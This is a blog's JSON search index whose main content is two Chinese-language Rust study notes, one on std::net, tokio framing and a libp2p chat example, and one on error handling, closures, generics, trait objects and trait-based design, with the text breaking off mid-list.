{"meta":{"title":"Racle`s Story","subtitle":"Recording & Thinking & Story telling","description":"个人博客&笔记","author":"江左时雨","url":"https://racleray.github.io","root":"/"},"pages":[{"title":"404","date":"2021-09-05T09:04:04.000Z","updated":"2023-08-07T11:54:31.022Z","comments":false,"path":"404/index.html","permalink":"https://racleray.github.io/404/index.html","excerpt":"","text":""},{"title":"About","date":"2021-09-05T08:58:08.000Z","updated":"2024-02-24T08:52:45.050Z","comments":false,"path":"about/index.html","permalink":"https://racleray.github.io/about/index.html","excerpt":"","text":"Recording &amp; Thinking &amp; Story telling 饭要好好吃，水要慢慢喝，音乐要静静地听，读书要认真地读。 等待，狮子身上，落满麻雀。 然后发现，只有所谓的原则，才会真正带来内心的平静。"},{"title":"Contact","date":"2021-09-05T09:00:44.000Z","updated":"2023-08-07T11:54:31.051Z","comments":false,"path":"contact/index.html","permalink":"https://racleray.github.io/contact/index.html","excerpt":"","text":""},{"title":"Categories","date":"2020-04-15T12:18:06.000Z","updated":"2023-08-07T11:54:31.051Z","comments":false,"path":"categories/index.html","permalink":"https://racleray.github.io/categories/index.html","excerpt":"","text":""},{"title":"Tags","date":"2020-04-15T12:18:26.000Z","updated":"2023-08-07T11:54:31.052Z","comments":false,"path":"tags/index.html","permalink":"https://racleray.github.io/tags/index.html","excerpt":"","text":""},{"title":"talking","date":"2021-11-01T05:08:08.000Z","updated":"2023-08-07T11:54:31.052Z","comments":false,"path":"talking/index.html","permalink":"https://racleray.github.io/talking/index.html","excerpt":"","text":""}],"posts":[{"title":"RUST Part3","slug":"RUST-part3","date":"2024-11-09T12:31:22.317Z","updated":"2024-11-10T13:31:11.188Z","comments":true,"path":"posts/8110420.html","link":"","permalink":"https://racleray.github.io/posts/8110420.html","excerpt":"Rust Notes","text":"Rust Web OSI 七层模型中，一般关注比较多的是网络层，传输层和应用层。Rust 中对于网络开发的支持是比较完善的。 low level 的开发工具：libpnet, smoltcp 序列化工具：nom, serde 网络基础库：tokio, std::net 日志库：tracing, slog 网络安全支持：rustls, orion, dalek-cryptography, ring, rustCrypto, snow 应用层网络：warp, axum, hyper, reqwest, tungstenite, actix-web, rocket, tonic, quinn, quiche, s2n-quic p2p 网络：libp2p 比如，std::net 为整个 TCP/IP 协议栈的使用提供了封装。tokio::net 提供了和 std::net 几乎一致的封装，且实现了高性能的异步网络。 std::net std::net 下提供了处理 TCP / UDP 的数据结构，以及一些辅助结构： TCP：TcpListener / TcpStream，处理服务器的监听以及客户端的连接 UDP：UdpSocket，处理 UDP socket IpAddr 是 IPv4 和 IPv6 地址的封装；SocketAddr，表示 IP 地址 + 端口的数据结构 server 示例 1234567891011121314151617181920use std::&#123; io::&#123;Read, Write&#125;, net::TcpListener, thread,&#125;;fn main() &#123; let listener = TcpListener::bind(\"0.0.0.0:9527\").unwrap(); loop &#123; let (mut stream, addr) = listener.accept().unwrap(); println!(\"Accepted a new connection: &#123;&#125;\", addr); thread::spawn(move || &#123; let mut buf = [0u8; 12]; stream.read_exact(&amp;mut buf).unwrap(); println!(\"data: &#123;:?&#125;\", String::from_utf8_lossy(&amp;buf)); stream.write_all(b\"glad to meet you!\").unwrap(); &#125;); &#125;&#125; client 示例 1234567891011121314use std::&#123; io::&#123;Read, Write&#125;, net::TcpStream,&#125;;fn main() &#123; let mut stream = TcpStream::connect(\"127.0.0.1:9527\").unwrap(); stream.write_all(b\"hello world!\").unwrap(); let mut buf = [0u8; 17]; stream.read_exact(&amp;mut buf).unwrap(); println!(\"data: &#123;:?&#125;\", String::from_utf8_lossy(&amp;buf));&#125; TcpStream 虽然没有实现 Drop trait，但是内部包装了 sys_common::net::TcpStream ，然后它又包装了 Socket。而Socket 是一个平台相关的结构，比如，在 Unix 下的实现是 FileDesc，然后它内部是一个 OwnedFd，最终会调用 libc::close(self.fd) 来关闭 fd，也就关闭了 TcpStream。 另外，loop + spawn 是处理网络连接的基本方式，但是带来的问题是，使用线程处理频繁连接和退出的网络连接，会有效率上的问题，以及线程间如何共享公共数据？ 大量连接问题 从资源的角度，过多的线程占用过多的内存，Rust 缺省的栈大小是 2M，10k 连接就会占用 20G 内存（可以通过 std::thread::Builder::new().stack_size() 修改默认栈大小）；从算力的角度，太多线程在连接数据到达时，会来回切换线程，导致 CPU 忙碌，无法处理更多的连接请求。 对于潜在的有大量连接的网络服务，使用线程不是一个好的方式。 使用协程由两种实现方式，一种是 Golang 风格的有栈协程，一种是 Rust 异步处理这样的无栈协程。比如，使用 tokio 这样的协程库。 共享数据问题 在 Rust 的简单场景下，可使用 Arc&lt;T&gt; 处理不需要修改的共享，使用 Arc&lt;RwLock&lt;T&gt;&gt; 处理需要进行修改的共享。 使用 Lock 处理时，自然会影响系统的吞吐量。一种方式时，降低锁的粒度，将一个全局锁，分解为多个局部的独立的锁。另一种方式是，使用异步消息，代替共享竞争，比如：std::sync::mpsc::channel, crossbeam_channel, tokio::sync::mpsc::channel, flume::unbounded。 网络数据 在 HTTP 协议下，基本上使用 JSON 构建 REST API / JSON API 。serde 定义的 Rust 数据结构具备 Serialize/Deserialize 的能力，然后用 serde_json 生成序列化后的 JSON 数据。 如果需要自定义协议，可以使用TLV（Type-Length-Value）的形式来描述协议数据，或者使用 protobuf 这类二进制协议。 当消息内容是不定长时，需要约定好如何区分消息的边界，如何识别一个完整的消息帧。比如，使用特殊的边界符号，或者使用长度字段。gRPC 使用了五个字节的 Length-Prefixed-Message，包含一个字节的压缩标志和四个字节的消息长度。在处理 gRPC 消息时，先读取 5 个字节，取出长度 N，再读取 N 个字节的消息内容。 消息尾添加 \\r\\n 一般用于基于文本的协议，比如 HTTP 头 / POP3 / Redis 的 RESP 协议等。 而基于二进制的消息体，则在消息前加入消息内容长度字段会更稳定。当然两种方式也可以一起使用。 使用 LengthDelimitedCodec 自动添加帧内消息内容长度 1234567891011121314151617181920212223242526use anyhow::Result;use bytes::Bytes;use futures::&#123;SinkExt, StreamExt&#125;;use tokio::net::TcpListener;use tokio_util::codec::&#123;Framed, LengthDelimitedCodec&#125;;#[tokio::main]async fn main() -&gt; Result&lt;()&gt; &#123; let listener = TcpListener::bind(\"127.0.0.1:9527\").await?; loop &#123; let (stream, addr) = listener.accept().await?; println!(\"accepted: &#123;:?&#125;\", addr); // LengthDelimitedCodec 默认 4 字节长度 let mut stream = Framed::new(stream, LengthDelimitedCodec::new()); tokio::spawn(async move &#123; // 这里解析得到的 data 会只包含消息主体，不包含长度 while let Some(Ok(data)) = stream.next().await &#123; println!(\"Got: &#123;:?&#125;\", String::from_utf8_lossy(&amp;data)); // 发送的消息只需要写入消息主体，不需要提供长度 // Framed/LengthDelimitedCodec 会自动计算并添加 stream.send(Bytes::from(\"goodbye world!\")).await.unwrap(); &#125; &#125;); &#125;&#125; client 示例 123456789101112131415161718use anyhow::Result;use bytes::Bytes;use futures::&#123;SinkExt, StreamExt&#125;;use tokio::net::TcpStream;use tokio_util::codec::&#123;Framed, LengthDelimitedCodec&#125;;#[tokio::main]async fn main() -&gt; Result&lt;()&gt; &#123; let stream = TcpStream::connect(\"127.0.0.1:9527\").await?; let mut stream = Framed::new(stream, LengthDelimitedCodec::new()); stream.send(Bytes::from(\"hello world\")).await?; if let Some(Ok(data)) = stream.next().await &#123; println!(\"Got: &#123;:?&#125;\", String::from_utf8_lossy(&amp;data)); &#125; Ok(())&#125; 其它问题 队头阻塞问题 Web 请求响应的模式中，可能出现队头阻塞的问题，包括 TCP 队头阻塞，以及 HTTP 队头阻塞。 一般 HTTP 应用层队头阻塞，可以通过分离控制平面和数据平面来解决。FTP, SIP 就是分离控制平面和数据平面的典型代表。另外，HTTP/2 通过多路复用，可以并行处理多个请求，不同 stream 之间数据可以乱序返回，以此解决 HTTP 队头阻塞的问题。 HTTP/3 通过 QUIC 协议，在 UDP 上实现了类似 TCP 的可靠传输，并且实现了类似 HTTP/2 的多路复用。 P2P 网络 P2P 网络中，节点之间直接通信，不需要经过中心服务器。P2P 网络中，节点之间可能存在多条通信路径，节点之间可以相互通信，节点可以随时加入和离开网络。 P2P 网络中，节点需要处理 NAT 穿越问题，节点需要处理防火墙穿越问题。 主流的解决方式是，使用 STUN/TURN/ICE 协议，发现自己的公网 IP/Port 地址，然后在 bootstrap/signaling server 中注册自己的地址，并发现邻居的地址。在此之上，节点还可以加入某个或者某些 topic，然后通过某些协议（比如 gossip）在整个 topic 下扩散消息。 libp2p 是 Rust 中流行的 P2P 网络库。节点之间通信协议有： 节点发现: mDNS, bootstrap, Kad DHT 内容发现：gossipsub, floodsub, Kad DHT 节点路由：Kad DHT 在网络安全方面，TLS 虽然能很好地保护客户端/服务器模型，然而证书的创建、发放以及信任对 P2P 网络是个问题，所以 P2P 网络倾向于使用自己的安全协议，或者使用 noise protocol，来构建安全等级可以媲美 TLS 1.3 的安全协议。 一个简单的示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124use anyhow::Result;use futures::StreamExt;use libp2p::&#123; core::upgrade, floodsub::&#123;self, Floodsub, FloodsubEvent, Topic&#125;, identity, mdns::&#123;Mdns, MdnsEvent&#125;, noise, swarm::&#123;NetworkBehaviourEventProcess, SwarmBuilder, SwarmEvent&#125;, tcp::TokioTcpConfig, yamux, NetworkBehaviour, PeerId, Swarm, Transport,&#125;;use std::borrow::Cow;use tokio::io::&#123;stdin, AsyncBufReadExt, BufReader&#125;;/// 处理 p2p 网络的 behavior 数据结构#[derive(NetworkBehaviour)]#[behaviour(event_process = true)]struct ChatBehavior &#123; /// flood subscription，比较浪费带宽，gossipsub 是更好的选择 floodsub: Floodsub, /// 本地节点发现机制 mdns: Mdns,&#125;impl ChatBehavior &#123; /// 创建一个新的 ChatBehavior pub async fn new(id: PeerId) -&gt; Result&lt;Self&gt; &#123; Ok(Self &#123; mdns: Mdns::new(Default::default()).await?, floodsub: Floodsub::new(id), &#125;) &#125;&#125;impl NetworkBehaviourEventProcess&lt;FloodsubEvent&gt; for ChatBehavior &#123; // 处理 floodsub 产生的消息 fn inject_event(&amp;mut self, event: FloodsubEvent) &#123; if let FloodsubEvent::Message(msg) = event &#123; let text = String::from_utf8_lossy(&amp;msg.data); println!(\"&#123;:?&#125;: &#123;:?&#125;\", msg.source, text); &#125; &#125;&#125;impl NetworkBehaviourEventProcess&lt;MdnsEvent&gt; for ChatBehavior &#123; fn inject_event(&amp;mut self, event: MdnsEvent) &#123; match event &#123; MdnsEvent::Discovered(list) =&gt; &#123; // 把 mdns 发现的新的 peer 加入到 floodsub 的 view 中 for (id, addr) in list &#123; println!(\"Got peer: &#123;&#125; with addr &#123;&#125;\", &amp;id, &amp;addr); self.floodsub.add_node_to_partial_view(id); &#125; &#125; MdnsEvent::Expired(list) =&gt; &#123; // 把 mdns 发现的离开的 peer 加入到 floodsub 的 view 中 for (id, addr) in list &#123; println!(\"Removed peer: &#123;&#125; with addr &#123;&#125;\", &amp;id, &amp;addr); self.floodsub.remove_node_from_partial_view(&amp;id); &#125; &#125; &#125; &#125;&#125;#[tokio::main]async fn main() -&gt; Result&lt;()&gt; &#123; let name = match std::env::args().nth(1) &#123; Some(arg) =&gt; Cow::Owned(arg), None =&gt; Cow::Borrowed(\"default\"), &#125;; // 创建 floodsub topic let topic = floodsub::Topic::new(name); // 创建 swarm let mut swarm = create_swarm(topic.clone()).await?; swarm.listen_on(\"/ip4/127.0.0.1/tcp/0\".parse()?)?; let mut stdin = BufReader::new(stdin()).lines(); loop &#123; tokio::select! &#123; line = stdin.next_line() =&gt; &#123; let line = line?.expect(\"stdin closed\"); swarm.behaviour_mut().floodsub.publish(topic.clone(), line.as_bytes()); &#125; event = swarm.select_next_some() =&gt; &#123; if let SwarmEvent::NewListenAddr &#123; address, .. &#125; = event &#123; println!(\"Listening on &#123;:?&#125;\", address); &#125; &#125; &#125; &#125;&#125;async fn create_swarm(topic: Topic) -&gt; Result&lt;Swarm&lt;ChatBehavior&gt;&gt; &#123; // 创建 identity（密钥对） let id_keys = identity::Keypair::generate_ed25519(); let peer_id = PeerId::from(id_keys.public()); println!(\"Local peer id: &#123;:?&#125;\", peer_id); // 使用 noise protocol 来处理加密和认证 let noise_keys = noise::Keypair::&lt;noise::X25519Spec&gt;::new().into_authentic(&amp;id_keys)?; // 创建传输层 let transport = TokioTcpConfig::new() .nodelay(true) .upgrade(upgrade::Version::V1) .authenticate(noise::NoiseConfig::xx(noise_keys).into_authenticated()) .multiplex(yamux::YamuxConfig::default()) .boxed(); let mut behavior = ChatBehavior::new(peer_id.clone()).await?; behavior.floodsub.subscribe(topic.clone()); let swarm = SwarmBuilder::new(transport, behavior, peer_id) .executor(Box::new(|fut| &#123; tokio::spawn(fut); &#125;)) .build(); Ok(swarm)&#125;","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Rust","slug":"Notes/Rust","permalink":"https://racleray.github.io/categories/Notes/Rust/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"https://racleray.github.io/tags/Rust/"}],"author":"HeRui"},{"title":"RUST Part2","slug":"rust-part2","date":"2024-10-22T13:19:35.225Z","updated":"2024-11-09T12:30:42.322Z","comments":true,"path":"posts/7f1634b6.html","link":"","permalink":"https://racleray.github.io/posts/7f1634b6.html","excerpt":"Rust Notes","text":"错误处理 错误处理，包含捕获、传播、处理。处理方法常见有，使用返回值（Golang），使用异常（Python，C++），使用类型系统（Rust，Haskell）。 使用返回值时，错误需要立即处理或者显式传递。使用异常需要开发者对其有较好的理解和把控，平衡好异常处理的开销。 Rust 使用类似 Haskell 的类型设计，使用 Option 和 Result 作为一个内部包含正常返回类型和错误返回类型的复合类型。 Result 类型声明时还有个 must_use 的标注，如果该类型对应的值没有被显式使用，编译器会提示。 如果你只想传播错误，不想就地处理，可以用 ? 操作符。 ? 操作符内部被展开成类似这样的代码： 1234match result &#123; Ok(v) =&gt; v, Err(e) =&gt; return Err(e.into())&#125; Rust 还为 Option 和 Result 提供了大量的辅助函数，如 map (处理Ok和Some) / map_err (处理 err) / and_then (处理 Ok和Some，同时捕获新的 Err)。 严重的错误 使用 panic! 和 catch_unwind 处理不可恢复或者不想恢复的错误。比如，如果协议变量写错了，最佳的方式是立刻 panic! 出来（当然还是需要考虑系统是否需要忽略部分错误），让错误立刻暴露，以便解决这个问题。 catch_unwind 作用和其它语言的 try {…} catch {…} 一样。 12345678910111213use std::panic;fn main() &#123; let result = panic::catch_unwind(|| &#123; println!(\"hello!\"); &#125;); assert!(result.is_ok()); let result = panic::catch_unwind(|| &#123; panic!(\"oh no!\"); // exception &#125;); assert!(result.is_err()); println!(\"panic captured: &#123;:#?&#125;\", result);&#125; 如果把 Rust 代码整个封装在 catch_unwind() 函数所需要传入的闭包中。一旦任何代码中，包括第三方 crates 的代码，含有能够导致 panic! 的代码，都会被捕获，并被转换为一个 Result。 错误类型转换 Rust 定义了 Error trait： 123456pub trait Error: Debug + Display &#123; fn source(&amp;self) -&gt; Option&lt;&amp;(dyn Error + 'static)&gt; &#123; ... &#125; fn backtrace(&amp;self) -&gt; Option&lt;&amp;Backtrace&gt; &#123; ... &#125; fn description(&amp;self) -&gt; &amp;str &#123; ... &#125; fn cause(&amp;self) -&gt; Option&lt;&amp;dyn Error&gt; &#123; ... &#125;&#125; 使用 thiserror和anyhow 可以简化自定义的错误类型。 比如使用 thiserror： 12345678910111213141516use thiserror::Error;#[derive(Error, Debug)]#[non_exhaustive]pub enum DataStoreError &#123; #[error(\"data store disconnected\")] Disconnect(#[from] std::io::Error), #[error(\"the data for key `&#123;0&#125;` is not available\")] Redaction(String), #[error(\"invalid header (expected &#123;expected:?&#125;, found &#123;found:?&#125;)\")] InvalidHeader &#123; expected: String, found: String, &#125;, #[error(\"unknown data store error\")] Unknown,&#125; 而 anyhow 实现了 anyhow::Error 和任意符合 Error trait 的错误类型之间的转换，让你可以使用 ? 操作符，不必再手工转换错误类型。anyhow 还可以让你很容易地抛出一些临时的错误，而不必费力定义错误类型，但是不提倡滥用这个能力。 闭包 闭包是一种匿名类型，一旦声明，就会产生一个新的类型，但这个类型无法被其它地方使用。这个类型就像一个结构体，会包含所有捕获的变量。其大小和内部的局部变量大小无关。 捕获顺序，会影响闭包保存变量的顺序。但是 Rust 编译器会对结构体内存进行内存优化，所以实际程序中内存顺序，不一定是 debug 所显式的顺序。 闭包是存储在栈上（和 Golang/Python/Java 这些不同，它们会申请堆内存），并且除了捕获的数据外，闭包本身不包含任何额外函数指针指向闭包的代码。 Golang/Python/Java 这些闭包，会有额外的堆内存分配、潜在的动态分派（闭包被处理成函数指针）、额外的内存回收。 使用了 move 且 move 到闭包内的数据结构需要满足 Send。闭包拥有数据的所有权，它的生命周期是 'static。 Rust 的性能却和使用命令式编程的 C 几乎一样，除了编译器优化的效果，也因为 Rust 闭包的性能和函数差不多。 Rust 闭包的效率非常高。首先闭包捕获的变量，都储存在栈上，没有堆内存分配。其次因为闭包在创建时会隐式地创建自己的类型，每个闭包都是一个新的类型。通过闭包自己唯一的类型，Rust 不需要额外的函数指针来运行闭包，所以闭包的调用效率和函数调用几乎一致。 闭包类型 FnOnce 定义如下： 1234pub trait FnOnce&lt;Args&gt; &#123; type Output; extern \"rust-call\" fn call_once(self, args: Args) -&gt; Self::Output;&#125; FnOnce 有一个关联类型 Output，显然，它是闭包返回值的类型。还有一个方法 call_once，要注意的是 call_once 第一个参数是 self，它会转移 self 的所有权到 call_once 函数中。所以它只能被调用一次。 FnMut 定义如下： 123456pub trait FnMut&lt;Args&gt;: FnOnce&lt;Args&gt; &#123; extern \"rust-call\" fn call_mut( &amp;mut self, args: Args ) -&gt; Self::Output;&#125; 首先，FnMut “继承”了 FnOnce，或者说 FnOnce 是 FnMut 的 super trait。所以FnMut也拥有 Output 这个关联类型和 call_once 这个方法。此外，它还有一个 call_mut() 方法。call_mut() 传入 &amp;mut self，它不移动 self，所以 FnMut 可以被多次调用。 Fn 定义如下： 123pub trait Fn&lt;Args&gt;: FnMut&lt;Args&gt; &#123; extern \"rust-call\" fn call(&amp;self, args: Args) -&gt; Self::Output;&#125; 可以看到，它“继承”了 FnMut，或者说 FnMut 是 Fn 的 super trait。这也就意味着任何需要 FnOnce 或者 FnMut 的场合，都可以传入满足 Fn 的闭包。Fn 不允许修改闭包的内部数据，也可以执行多次。 示例 tonic（Rust 下的 gRPC 库）的例子： 12345678910111213pub trait Interceptor &#123; /// Intercept a request before it is sent, optionally cancelling it. fn call(&amp;mut self, request: crate::Request&lt;()&gt;) -&gt; Result&lt;crate::Request&lt;()&gt;, Status&gt;;&#125;impl&lt;F&gt; Interceptor for Fwhere F: FnMut(crate::Request&lt;()&gt;) -&gt; Result&lt;crate::Request&lt;()&gt;, Status&gt;,&#123; fn call(&amp;mut self, request: crate::Request&lt;()&gt;) -&gt; Result&lt;crate::Request&lt;()&gt;, Status&gt; &#123; self(request) &#125;&#125; 这里为 F 实现 Trait，把 Request 和 闭包 F 统一起来调用。 泛型数据结构使用 BufReader 代码示例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849pub struct BufReader&lt;R: ?Sized&gt; &#123; buf: Buffer, inner: R,&#125;impl&lt;R: Read&gt; BufReader&lt;R&gt; &#123; pub fn new(inner: R) -&gt; BufReader&lt;R&gt; &#123; BufReader::with_capacity(DEFAULT_BUF_SIZE, inner) &#125; pub fn with_capacity(capacity: usize, inner: R) -&gt; BufReader&lt;R&gt; &#123; BufReader &#123; inner, buf: Buffer::with_capacity(capacity) &#125; &#125;&#125;impl&lt;R: Read + ?Sized&gt; BufReader&lt;R&gt; &#123; pub fn peek(&amp;mut self, n: usize) -&gt; io::Result&lt;&amp;[u8]&gt; &#123;...&#125;&#125;impl&lt;R: ?Sized&gt; BufReader&lt;R&gt; &#123; pub fn get_ref(&amp;self) -&gt; &amp;R &#123; &amp;self.inner &#125; pub fn get_mut(&amp;mut self) -&gt; &amp;mut R &#123; &amp;mut self.inner &#125; pub fn buffer(&amp;self) -&gt; &amp;[u8] &#123; self.buf.buffer() &#125; pub fn into_inner(self) -&gt; R where R: Sized, &#123; self.inner &#125; pub(in crate::io) fn discard_buffer(&amp;mut self) &#123; self.buf.discard_buffer() &#125;&#125;impl&lt;R: ?Sized + Read&gt; Read for BufReader&lt;R&gt; &#123; fn read(&amp;mut self, buf: &amp;mut [u8]) -&gt; io::Result&lt;usize&gt; &#123;...&#125; ...&#125; 根据不同的约束，分成了不同的代码块。 三种常见的使用场景 使用泛型参数延迟数据结构的绑定； 使用泛型参数和 PhantomData，声明数据结构中不直接使用，但在实现过程中需要用到的类型。PhantomData 长度为零，是个 ZST（Zero-Sized Type），就像不存在一样，唯一作用就是类型的标记； 123456789101112131415#[derive(Debug, Default, PartialEq, Eq)]pub struct Identifier&lt;T&gt; &#123; inner: u64, _tag: PhantomData&lt;T&gt;,&#125;#[derive(Debug, Default, PartialEq, Eq)]pub struct User &#123; id: Identifier&lt;Self&gt;,&#125;#[derive(Debug, Default, PartialEq, Eq)]pub struct Product &#123; id: Identifier&lt;Self&gt;,&#125; 使用泛型参数让同一个数据结构对同一个 trait 可以拥有不同的实现。 12345678910111213141516171819202122232425262728293031323334353637#[derive(Debug, Default)]pub struct Equation&lt;IterMethod&gt; &#123; current: u32, _method: PhantomData&lt;IterMethod&gt;,&#125;#[derive(Debug, Default)]pub struct Linear;#[derive(Debug, Default)]pub struct Quadratic;impl Iterator for Equation&lt;Linear&gt; &#123; type Item = u32; fn next(&amp;mut self) -&gt; Option&lt;Self::Item&gt; &#123; self.current += 1; if self.current &gt;= u32::MAX &#123; return None; &#125; Some(self.current) &#125;&#125;impl Iterator for Equation&lt;Quadratic&gt; &#123; type Item = u32; fn next(&amp;mut self) -&gt; Option&lt;Self::Item&gt; &#123; self.current += 1; if self.current &gt;= u16::MAX as u32 &#123; return None; &#125; Some(self.current * self.current) &#125;&#125; 另外： 泛型参数支持默认值； impl Trait 与 &lt;Constrain: Trait&gt; 是相同的； 动态分配的 trait object trait object 是 Rust 处理多态的手段。 1234// 返回 trait objectpub fn trait_object_as_return_working(i: u32) -&gt; Box&lt;dyn Iterator&lt;Item = u32&gt;&gt; &#123; Box::new(std::iter::once(i))&#125; 使用 trait object 是有额外的代价的，首先这里有一次额外的堆分配，其次动态分派会带来一定的性能损失。 当我们在运行时想让某个具体类型，只表现出某个 trait 的行为，可以通过将其赋值给一个 dyn T，无论是 &amp;dyn T，还是 Box&lt;dyn T&gt;，还是 Arc&lt;dyn T&gt;。此时，原有的类型被抹去，Rust 会创建一个 trait object，并为其分配满足该 trait 的 vtable。 在编译 dyn T 时，Rust 会为使用了 trait object 类型的 trait 实现，生成相应的 vtable，放在可执行文件中（一般在 TEXT 或 RODATA 段）。 当 trait object 调用 trait 的方法时，它会先从 vptr 中找到对应的 vtable，进而找到对应的方法来执行。 1234567891011121314151617181920pub type BoxedError = Box&lt;dyn Error + Send + Sync&gt;;pub trait Executor &#123; fn run(&amp;self) -&gt; Result&lt;Option&lt;i32&gt;, BoxedError&gt;;&#125;/// 使用泛型参数pub fn execute_generics(cmd: &amp;impl Executor) -&gt; Result&lt;Option&lt;i32&gt;, BoxedError&gt; &#123; cmd.run()&#125;/// 使用 trait object: &amp;dyn Tpub fn execute_trait_object(cmd: &amp;dyn Executor) -&gt; Result&lt;Option&lt;i32&gt;, BoxedError&gt; &#123; cmd.run()&#125;/// 使用 trait object: Box&lt;dyn T&gt;pub fn execute_boxed_trait_object(cmd: Box&lt;dyn Executor&gt;) -&gt; Result&lt;Option&lt;i32&gt;, BoxedError&gt; &#123; cmd.run()&#125; &amp;dyn Executor 和 Box 是 trait object，前者在栈上，后者分配在堆上。 学习 Trait 设计的开源库 ：snow snow-doc 用 trait 做桥接 1234567891011121314// Engine trait：未来可以添加更多的 engine，主流程只需要替换 enginepub trait Engine &#123; // 对 engine 按照 specs 进行一系列有序的处理 fn apply(&amp;mut self, specs: &amp;[Spec]); // 从 engine 中生成目标图片，注意这里用的是 self，而非 self 的引用 fn generate(self, format: ImageOutputFormat) -&gt; Vec&lt;u8&gt;;&#125;// 使用 image engine 处理let mut engine: Photon = data .try_into() .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;engine.apply(&amp;spec.specs);let image = engine.generate(ImageOutputFormat::Jpeg(85)); 可读性优化 12345678910111213141516171819202122232425262728293031// 从 Bytes 转换成 Photon 结构impl TryFrom&lt;Bytes&gt; for Photon &#123; type Error = anyhow::Error; fn try_from(data: Bytes) -&gt; Result&lt;Self, Self::Error&gt; &#123; Ok(Self(open_image_from_bytes(&amp;data)?)) &#125;&#125;// Engine trait：未来可以添加更多的 engine，主流程只需要替换 enginepub trait Engine &#123; // 生成一个新的 engine fn create&lt;T&gt;(data: T) -&gt; Result&lt;Self&gt; where Self: Sized, T: TryInto&lt;Self&gt;, &#123; data.try_into() .map_err(|_| anyhow!(\"failed to create engine\")) &#125; // 对 engine 按照 specs 进行一系列有序的处理 fn apply(&amp;mut self, specs: &amp;[Spec]); // 从 engine 中生成目标图片，注意这里用的是 self，而非 self 的引用 fn generate(self, format: ImageOutputFormat) -&gt; Vec&lt;u8&gt;;&#125;// 使用 image engine 处理let mut engine = Photon::create(data) .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;engine.apply(&amp;spec.specs);let image = engine.generate(ImageOutputFormat::Jpeg(85)); 桥接也可以用来隐藏具体实现细节： 1234567let secret_api = api_with_user_token(&amp;user, params);let data: Vec&lt;Status&gt; = reqwest::get(secret_api)?.json()?;// 隐藏 api 调用细节的 traitpub trait FriendCircle &#123; fn get_published(&amp;self, user: &amp;User) -&gt; Result&lt;Vec&lt;Status&gt;, FriendCircleError&gt;;&#125; 用 trait 作为约束反馈信息给上层 123456789101112pub trait Engine &#123; // 生成一个新的 engine fn create&lt;T&gt;(data: T) -&gt; Result&lt;Self&gt; where Self: Sized, T: TryInto&lt;Self&gt;, // 只要 T 实现了 TryInto&lt;Self&gt; 即可 &#123; data.try_into() .map_err(|_| anyhow!(\"failed to create engine\")) &#125; ...&#125; 用 trait 实现 SOLID SRP：单一职责原则，是指每个模块应该只负责单一的功能，不应该让多个功能耦合在一起，而是应该将其组合在一起。 OCP：开闭原则，是指软件系统应该对修改关闭，而对扩展开放。trait 的不同实现，或者 trait 的继承扩展。 LSP：里氏替换原则，是指如果组件可替换，那么这些可替换的组件应该遵守相同的约束，或者说接口。比如，上文中实现了 Engine trait 的 engine 可以进行替换。 ISP：接口隔离原则，是指使用者只需要知道他们感兴趣的方法，而不该被迫了解和使用对他们来说无用的方法或者功能。一般当 trait 满足 SRP 单一职责原则时，它也满足接口隔离原则 DIP：依赖反转原则，是指某些场合下底层代码应该依赖高层代码，而非高层代码去依赖底层代码。 示例 1234567pub trait IntoIterator &#123; type Item; type IntoIter: Iterator&lt;Item = Self::Item&gt;; // 在使用了引用的场景，返回对象的所有权 fn into_iter(self) -&gt; Self::IntoIter;&#125; Service 注册： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455pub struct ServiceInner&lt;Store&gt; &#123; store: Store, on_received: Vec&lt;fn(&amp;CommandRequest)&gt;, on_executed: Vec&lt;fn(&amp;CommandResponse)&gt;, on_before_send: Vec&lt;fn(&amp;mut CommandResponse)&gt;, on_after_send: Vec&lt;fn()&gt;,&#125;impl&lt;Store: Storage&gt; ServiceInner&lt;Store&gt; &#123; pub fn new(store: Store) -&gt; Self &#123; Self &#123; store, on_received: Vec::new(), on_executed: Vec::new(), on_before_send: Vec::new(), on_after_send: Vec::new(), &#125; &#125; pub fn fn_received(mut self, f: fn(&amp;CommandRequest)) -&gt; Self &#123; self.on_received.push(f); self &#125; pub fn fn_executed(mut self, f: fn(&amp;CommandResponse)) -&gt; Self &#123; self.on_executed.push(f); self &#125; pub fn fn_before_send(mut self, f: fn(&amp;mut CommandResponse)) -&gt; Self &#123; self.on_before_send.push(f); self &#125; pub fn fn_after_send(mut self, f: fn()) -&gt; Self &#123; self.on_after_send.push(f); self &#125;&#125;impl&lt;Store: Storage&gt; From&lt;ServiceInner&lt;Store&gt;&gt; for Service&lt;Store&gt; &#123; fn from(inner: ServiceInner&lt;Store&gt;) -&gt; Self &#123; Self &#123; inner: Arc::new(inner), &#125; &#125;&#125;let service: Service = ServiceInner::new(MemTable::default()) .fn_received(|_: &amp;CommandRequest| &#123;&#125;) .fn_received(b) .fn_executed(c) .fn_before_send(d) .fn_after_send(e) .into(); 可变泛型 trait 和 不可变泛型 trait： 12345678910111213141516171819202122232425262728293031323334353637383940/// 事件通知（不可变事件）pub trait Notify&lt;Arg&gt; &#123; fn notify(&amp;self, arg: &amp;Arg);&#125;/// 事件通知（可变事件）pub trait NotifyMut&lt;Arg&gt; &#123; fn notify(&amp;self, arg: &amp;mut Arg);&#125;impl&lt;Arg&gt; Notify&lt;Arg&gt; for Vec&lt;fn(&amp;Arg)&gt; &#123; #[inline] fn notify(&amp;self, arg: &amp;Arg) &#123; for f in self &#123; f(arg) &#125; &#125;&#125;impl&lt;Arg&gt; NotifyMut&lt;Arg&gt; for Vec&lt;fn(&amp;mut Arg)&gt; &#123; #[inline] fn notify(&amp;self, arg: &amp;mut Arg) &#123; for f in self &#123; f(arg) &#125; &#125;&#125;impl&lt;Store: Storage&gt; Service&lt;Store&gt; &#123; pub fn execute(&amp;self, cmd: CommandRequest) -&gt; CommandResponse &#123; self.inner.on_received.notify(&amp;cmd); let mut res = dispatch(cmd, &amp;self.inner.store); self.inner.on_executed.notify(&amp;res); self.inner.on_before_send.notify(&amp;mut res); res &#125;&#125; 三方库推荐 tonic / axum / tokio-uring / tokio-rustls / tokio-stream / tokio-util 等网络和异步 IO 库 bytes / tracing / 